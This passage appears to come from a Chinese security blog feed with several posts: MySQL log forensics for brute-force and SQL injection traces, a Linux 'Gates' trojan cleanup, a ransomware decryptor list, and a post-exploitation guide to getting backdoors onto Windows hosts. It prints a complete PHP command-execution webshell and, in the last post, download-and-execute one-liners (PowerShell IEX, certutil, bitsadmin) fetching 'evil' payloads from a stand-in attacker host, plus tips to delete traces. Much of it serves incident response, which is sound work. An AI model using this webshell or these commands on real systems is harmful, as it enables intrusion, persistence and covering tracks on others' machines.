<span class="number">104</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;mysql&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">100</span> <span class="keyword">Connect</span>root@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  <span class="number">101</span> <span class="keyword">Connect</span>root@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  <span class="number">101</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">   <span class="number">99</span> <span class="keyword">Connect</span>root@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">   <span class="number">99</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">105</span> <span class="keyword">Connect</span>mysql@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  <span class="number">105</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;mysql&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">100</span> Query<span class="keyword">set</span> autocommit=<span class="number">0</span></span><br><span class="line">  <span class="number">102</span> <span class="keyword">Connect</span>mysql@<span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">  <span class="number">102</span> <span class="keyword">Connect</span><span class="keyword">Access</span> denied <span class="keyword">for</span> <span class="keyword">user</span> <span class="string">&#x27;mysql&#x27;</span>@<span class="string">&#x27;192.168.204.1&#x27;</span> (<span class="keyword">using</span> <span class="keyword">password</span>: YES)</span><br><span class="line">  <span class="number">100</span> Quit`</span><br></pre></td></tr></table></figure><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p><p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">190601</span> <span class="number">22</span>:<span class="number">03</span>:<span class="number">20</span>     <span class="number">100</span> Connectroot@<span class="number">192.168.204.1</span> <span class="literal">on</span> </span><br><span class="line">   <span class="attribute">100</span> Queryset autocommit=<span class="number">0</span></span><br><span class="line">   <span class="attribute">100</span> Quit</span><br></pre></td></tr></table></figure><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p><p>Navicat for MySQL登录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">190601</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">07</span>  <span class="number">106</span> <span class="keyword">Connect</span>root<span class="variable">@192</span><span class="number">.168</span><span class="number">.204</span><span class="number">.1</span> <span class="keyword">on</span> </span><br><span class="line">         <span class="number">106</span> Query<span class="keyword">SET</span> NAMES utf8</span><br><span class="line">         <span class="number">106</span> Query<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;lower_case_%&#x27;</span></span><br><span class="line">         <span class="number">106</span> Query<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;profiling&#x27;</span></span><br><span class="line">         <span class="number">106</span> Query<span class="keyword">SHOW</span> DATABASES</span><br></pre></td></tr></table></figure><p>命令行登录：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">190601</span> <span class="number">22</span>:<span class="number">17</span>:<span class="number">25</span>  <span class="number">111</span> Connectroot@localhost <span class="literal">on</span> </span><br><span class="line">         <span class="attribute">111</span> Queryselect @@version_comment limit <span class="number">1</span></span><br><span class="line"><span class="attribute">190601</span> <span class="number">22</span>:<span class="number">17</span>:<span class="number">56</span>  <span class="number">111</span> Quit</span><br></pre></td></tr></table></figure><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p><p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p><p>登录失败的记录：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">102 </span>Connectmysql@<span class="number">192.168</span>.<span class="number">204.1</span> <span class="keyword">on</span> </span><br><span class="line"><span class="symbol">102 </span>ConnectAccess denied <span class="keyword">for</span> user <span class="comment">&#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span></span><br></pre></td></tr></table></figure><p>利用shell命令进行简单的分析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有哪些IP在爆破？</span></span><br><span class="line">grep  <span class="string">&quot;Access denied&quot;</span> mysql.log |<span class="built_in">cut</span> -d <span class="string">&quot;&#x27;&quot;</span> -f4|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br><span class="line">     27 192.168.204.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破用户名字典都有哪些？</span></span><br><span class="line">grep  <span class="string">&quot;Access denied&quot;</span> mysql.log |<span class="built_in">cut</span> -d <span class="string">&quot;&#x27;&quot;</span> -f2|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br><span class="line">     13 mysql</span><br><span class="line">     12 root</span><br><span class="line">      1 root</span><br><span class="line">      1 mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p><p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p><h3 id="0x03-SQL注入入侵痕迹">0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-5-3.png" alt=""></p><p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p><p>tmpbwyov.php：</p><?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>`<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、检查网站目录下，是否存在一些木马文件：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-5-4.png" alt=""></p><p>2、检查是否有UDF提权、MOF提权痕迹</p><p>检查目录是否有异常文件</p><p>mysql\lib\plugin</p><p>c:/windows/system32/wbem/mof/</p><p>检查函数是否删除</p><p><code>select * from mysql.func</code></p><p>3、结合web日志分析。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux实战篇第4篇：盖茨木马</title>
      <link href="/posts/f26f7994.html"/>
      <url>/posts/f26f7994.html</url>
      
        <content type="html"><![CDATA[<h2 id="第4篇：盖茨木马">第4篇：盖茨木马</h2><h3 id="0x00-前言">0x00 前言</h3><p>​Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马，主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，网站管理员发现服务器CPU资源异常，几个异常进程占用大量网络带宽：</p><p><img src="./image/linux-13-1.png" alt=""></p><h3 id="0x02-事件分析">0x02 事件分析</h3><p><strong>异常IP连接：</strong></p><p><img src="./image/linux-13-2.png" alt=""></p><p><strong>异常进程：</strong></p><p>​         查看进行发现ps aux进程异常，进入该目录发现多个命令，猜测命令可能已被替换</p><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="./image/linux-13-3.png" alt=""></p><p><strong>异常启动项</strong></p><p>进入rc3.d目录可以发现多个异常进行：</p><p>/etc/rc.d/rc3.d/S97DbSecuritySpt</p><p>/etc/rc.d/rc3.d/S99selinux</p><p><img src="./image/linux-13-4.png" alt=""></p><p><img src="./image/linux-13-5.png" alt=""></p><p><strong>搜索病毒原体</strong></p><p>find / -size -1223124c -size +1223122c -exec ls -id {} ;   搜索1223123大小的文件</p><p><img src="./image/linux-13-6.png" alt=""></p><p>从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：</p><blockquote><p>Linux平台“盖茨木马”分析</p><p><a href="http://www.freebuf.com/articles/system/117823.html">http://www.freebuf.com/articles/system/117823.html</a></p><p>悬镜服务器卫士丨Linux平台“盖茨木马”分析</p><p><a href="http://www.sohu.com/a/117926079_515168">http://www.sohu.com/a/117926079_515168</a></p></blockquote><p>手动清除木马过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1、简单判断有无木马</span><br><span class="line"><span class="comment">#有无下列文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/rc.d/init.d/selinux</span><br><span class="line"><span class="built_in">cat</span> /etc/rc.d/init.d/DbSecuritySpt</span><br><span class="line"><span class="built_in">ls</span> /usr/bin/bsd-port</span><br><span class="line"><span class="built_in">ls</span> /usr/bin/dpkgd</span><br><span class="line"><span class="comment">#查看大小是否正常</span></span><br><span class="line"><span class="built_in">ls</span> -lh /bin/netstat</span><br><span class="line"><span class="built_in">ls</span> -lh /bin/ps</span><br><span class="line"><span class="built_in">ls</span> -lh /usr/sbin/lsof</span><br><span class="line"><span class="built_in">ls</span> -lh /usr/sbin/ss</span><br><span class="line"></span><br><span class="line">2、上传如下命令到/root下</span><br><span class="line">ps netstat ss lsof</span><br><span class="line"></span><br><span class="line">3、删除如下目录及文件</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/bin/dpkgd (ps netstat lsof ss)</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/bin/bsd-port     <span class="comment">#木马程序</span></span><br><span class="line"><span class="built_in">rm</span> -f /usr/bin/.sshd         <span class="comment">#木马后门</span></span><br><span class="line"><span class="built_in">rm</span> -f /tmp/gates.lod</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/moni.lod</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序)</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc1.d/S97DbSecuritySpt</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc2.d/S97DbSecuritySpt</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc3.d/S97DbSecuritySpt</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc4.d/S97DbSecuritySpt</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc5.d/S97DbSecuritySpt</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty)</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc1.d/S99selinux</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc2.d/S99selinux</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc3.d/S99selinux</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc4.d/S99selinux</span><br><span class="line"><span class="built_in">rm</span> -f /etc/rc.d/rc5.d/S99selinux</span><br><span class="line">4、找出异常程序并杀死</span><br><span class="line">5、删除含木马命令并重新安装</span><br></pre></td></tr></table></figure><h3 id="0x03-命令替换">0x03 命令替换</h3><p><strong>RPM check检查：</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查</span><br><span class="line">./rpm -Va &gt; rpm.<span class="built_in">log</span></span><br><span class="line">如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是<span class="number">8</span>位长字符串, <span class="string">``</span>c 用以指配置文件, 接着是文件名. <span class="number">8</span>位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。<span class="string">``</span>. (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</span><br></pre></td></tr></table></figure><p><img src="./image/linux-13-7.png" alt=""></p><p><strong>命令替换：</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rpm2cpio 包全名 |  cpio -idv .文件绝对路径   rpm包中文件提取</span><br><span class="line">Rpm2cpio  将rpm包转换为cpio格式的命令 </span><br><span class="line">Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件</span><br><span class="line"></span><br><span class="line">Cpio 选项 &lt; [文件|设备]</span><br><span class="line"><span class="deletion">-i：copy-in模式，还原</span></span><br><span class="line"><span class="deletion">-d：还原时自动新建目录</span></span><br><span class="line"><span class="deletion">-v：显示还原过程</span></span><br></pre></td></tr></table></figure><p>文件提取还原案例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rpm  -qf /bin/ls  查询<span class="built_in">ls</span>命令属于哪个软件包</span><br><span class="line"><span class="built_in">mv</span>  /bin/ls /tmp  </span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中<span class="built_in">ls</span>命令到当前目录的/bin/ls下</span><br><span class="line"><span class="built_in">cp</span> /root/bin/ls  /bin/ 把<span class="built_in">ls</span>命令复制到/bin/目录 修复文件丢失</span><br><span class="line"></span><br><span class="line">挂载命令rpm包：</span><br><span class="line"><span class="built_in">mkdir</span>  /mnt/chrom/  建立挂载点</span><br><span class="line">mount -t iso9660 /dev/cdrom  /mnt/cdrom/  挂在光盘</span><br><span class="line">mount/dev/sr0 /mnt/cdrom/</span><br><span class="line"></span><br><span class="line">卸载命令</span><br><span class="line">umount  设备文件名或挂载点</span><br><span class="line">umount /mnt/cdrom/</span><br></pre></td></tr></table></figure><p><img src="./image/linux-13-8.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第5篇：勒索病毒自救指南</title>
      <link href="/posts/9cb638dc.html"/>
      <url>/posts/9cb638dc.html</url>
      
        <content type="html"><![CDATA[<h2 id="第5篇：勒索病毒自救指南">第5篇：勒索病毒自救指南</h2><h3 id="前言">前言</h3><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p><p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p><p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p><p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p><p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p><p><strong>一、勒索病毒搜索引擎</strong></p><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p><p><img src="https://gitee.com/eviden/img/raw/master/20200406-1.png" alt=""></p><p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p><p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p><p>官网：<a href="http://lesuobingdu.360.cn">http://lesuobingdu.360.cn</a></p><p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p><p>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></p><p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p><p>官网：<a href="https://lesuo.venuseye.com.cn">https://lesuo.venuseye.com.cn</a></p><p>【奇安信】勒索病毒搜索引擎</p><p>官网：<a href="https://lesuobingdu.qianxin.com">https://lesuobingdu.qianxin.com</a></p><p>【深信服】勒索病毒搜索引擎</p><p>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></p><hr><p><strong>二、勒索软件解密工具集</strong></p><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p><p>【腾讯哈勃】勒索软件专杀工具</p><p>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></p><p>【金山毒霸】勒索病毒免疫工具</p><p>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p><p>【火绒】安全工具下载</p><p>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></p><p>【瑞星】解密工具下载</p><p>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p><p>【nomoreransom】勒索软件解密工具集</p><p>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>【MalwareHunterTeam】勒索软件解密工具集</p><p>官网：<a href="https://id-ransomware.malwarehunterteam.com">https://id-ransomware.malwarehunterteam.com</a></p><p>【卡巴斯基】免费勒索解密器</p><p>官网：<a href="https://noransom.kaspersky.com">https://noransom.kaspersky.com</a></p><p>【Avast】免费勒索软件解密工具</p><p>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p><p>【Emsisoft】免费勒索软件解密工具</p><p>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p><p>【GitHub 项目】勒索病毒解密工具收集汇总</p><p>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第5篇：Windows命令行文件下载方式汇总</title>
      <link href="/posts/14bca439.html"/>
      <url>/posts/14bca439.html</url>
      
        <content type="html"><![CDATA[<p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p><p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式</strong>**。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p><p>**在这里，**<strong>本文收集了15种常见的文件下载执行的方式，并结合具体案例</strong>，让我们一起来看看是怎么实现的吧。</p><hr><ul><li>PowerShell</li><li>Bitsadmin</li><li>certutil</li><li>wget</li><li>ipc$文件共享</li><li>FTP</li><li>TFTP</li><li>WinScp</li><li>msiexec</li><li>IEExec</li><li>mshta</li><li>rundll32</li><li>regsvr32</li><li>MSXSL.EXE</li><li>pubprn.vbs</li></ul><hr><p><strong>1、PowerShell</strong></p><p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。</p><p>远程下载文件保存在本地：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">System</span>.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.28.128/imag/evil.txt&#x27;</span>,<span class="string">&#x27;evil.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p>远程执行命令：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w <span class="keyword">hidden</span> -<span class="keyword">c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-1.png" alt=""></p><p><strong>2、Bitsadmin</strong></p><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\<span class="built_in">test</span>\1.txt</span><br></pre></td></tr></table></figure><p>输入以上命令，成功下载文件。</p><p><img src="./image/20200413-2.png" alt=""></p><p><strong>3、certutil</strong></p><p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p><p>注：缓存目录为：“%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载文件</span></span><br><span class="line">certutil -urlcache -split -f http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">28.128</span><span class="regexp">/imag/</span>evil.txt test.php</span><br><span class="line"><span class="comment">#删除缓存</span></span><br><span class="line">certutil -urlcache -split -f http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">28.128</span><span class="regexp">/imag/</span>evil.txt <span class="keyword">delete</span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-3.png" alt=""></p><p><strong>4、wget</strong></p><p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p><p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O <span class="string">&quot;evil.txt&quot;</span> http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">28.128</span><span class="regexp">/imag/</span>evil.txt</span><br></pre></td></tr></table></figure><p><img src="./image/20200413-4.png" alt=""></p><p><strong>5、ipc$文件共享</strong></p><p>IPC$(Internet Process Connection)是共享&quot;命名管道&quot;的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立远程IPC连接</span></span><br><span class="line"><span class="attribute">net</span> use \\<span class="number">192.168.28.128</span>\ipc$ /user:administrator <span class="string">&quot;abc123!&quot;</span></span><br><span class="line"><span class="comment">#复制远程文件到本地主机</span></span><br><span class="line"><span class="attribute">copy</span> \\<span class="number">192.168.28.128</span>\c$\<span class="number">2</span>.txt D:\test</span><br></pre></td></tr></table></figure><p><img src="./image/20200413-5.png" alt=""></p><p>**6、FTP **</p><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="./image/20200413-6.png" alt=""></p><p><strong>7、TFTP</strong></p><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">tftp</span> -i 你的<span class="built_in">IP</span> <span class="meta">get</span> 要下载文件 存放位置</span><br></pre></td></tr></table></figure><p><img src="./image/20200413-7.png" alt=""></p><p><strong>8、WinScp</strong></p><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传</span></span><br><span class="line">winscp.exe <span class="regexp">/console /</span>command <span class="string">&quot;option batch continue&quot;</span> <span class="string">&quot;option confirm off&quot;</span> <span class="string">&quot;open sftp://bypass:abc123!@192.168.28.131:22&quot;</span> <span class="string">&quot;option transfer binary&quot;</span> <span class="string">&quot;put D:\1.txt  /tmp/&quot;</span> <span class="string">&quot;exit&quot;</span> /log=log_file.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#下载</span></span><br><span class="line">winscp.exe <span class="regexp">/console /</span>command <span class="string">&quot;option batch continue&quot;</span> <span class="string">&quot;option confirm off&quot;</span> <span class="string">&quot;open sftp://bypass:abc123!@192.168.28.131:22&quot;</span> <span class="string">&quot;option transfer binary&quot;</span> <span class="string">&quot;get /tmp D:\test\app\&quot; &quot;</span><span class="keyword">exit</span><span class="string">&quot; 